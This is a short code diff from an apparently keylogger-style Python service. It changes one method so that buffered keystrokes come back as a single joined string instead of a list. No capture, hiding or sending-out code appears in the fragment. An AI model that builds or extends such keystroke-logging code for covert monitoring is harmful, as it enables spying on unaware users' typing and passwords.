@@ -37,6 +37,6 @@ class KeyLoggerService(IKeyLogger):
             self.listener = None
 
     def get_logged_keys(self) -> list:
-        temp = self.buffer
+        temp = " ".join(self.buffer)
         self.buffer =[]
         return temp
